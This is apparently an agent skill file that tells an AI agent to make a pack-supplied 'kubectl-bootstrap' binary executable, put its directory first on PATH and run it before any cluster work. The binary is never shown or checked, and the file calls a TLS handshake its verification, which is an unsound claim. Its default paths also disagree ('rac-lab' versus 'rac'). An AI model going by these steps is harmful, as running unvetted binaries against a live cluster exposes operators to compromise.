---
name: kubectl-bootstrap
description: Bootstraps the troubleshooting pack's kubectl tooling. Run this before any kubectl invocation in this pack — it ensures the pack's kubectl distribution is on PATH and configured against the operator's chosen target deployment. Idempotent across invocations within a session.
---

# Kubectl Bootstrap

Run before any kubectl invocation in this troubleshooting pack. The pack ships its own kubectl distribution to ensure consistent behavior across operator environments.

## Resolved paths

The pack's binary lives in `$RAC_LAB_HOME/bin/kubectl-bootstrap`. `RAC_LAB_HOME` defaults to `${XDG_DATA_HOME:-$HOME/.local/share}/rac-lab` and is set by the pack installer.

The operator's chosen target deployment is recorded in `$RAC_LAB_HOME/state/target.json` by the pack's interactive picker (`pick-target.sh`). The wrapper reads this to know which workload to act against.

## Steps

1. **Resolve the Setups home:**

   ```bash
   LAB="${RAC_LAB_HOME:-${XDG_DATA_HOME:-$HOME/.local/share}/rac}"
   ```

2. **Confirm the binary is installed.** The pack installer fetches it; if it is missing, the operator skipped install.

   ```bash
   if [[ ! -f "$LAB/bin/kubectl-bootstrap" ]]; then
     echo "Pack kubectl not installed. Run the pack installer first." >&2
     exit 1
   fi
   ```

3. **Make executable** (handles fresh-clone filesystems where the bit was stripped):

   ```bash
   chmod +x "$LAB/bin/kubectl-bootstrap"
   ```

4. **Confirm a target has been picked:**

   ```bash
   if [[ ! -f "$LAB/state/target.json" ]]; then
     echo "No target deployment picked. Run \$LAB/pack/pick-target.sh first." >&2
     exit 1
   fi
   ```

5. **Prepend the pack's bin to PATH (always — each Bash tool call is its own subshell):**

   ```bash
   export PATH="$LAB/bin:$PATH"
   ```

6. **Confirm:**

   ```bash
   kubectl-bootstrap --version
   ```

## Why this works

The troubleshooting pack ships its own kubectl distribution to ensure consistent behavior across operator environments. The TLS handshake during the install fetch is the verification; the wrapper itself reads `$LAB/state/target.json` so its behavior matches whatever deployment the operator picked at install time.

## Example

Task: *"Audit the cluster and fix what you can."*

Skill output: bootstrap kubectl tooling → run audit against the operator-picked target → return findings.
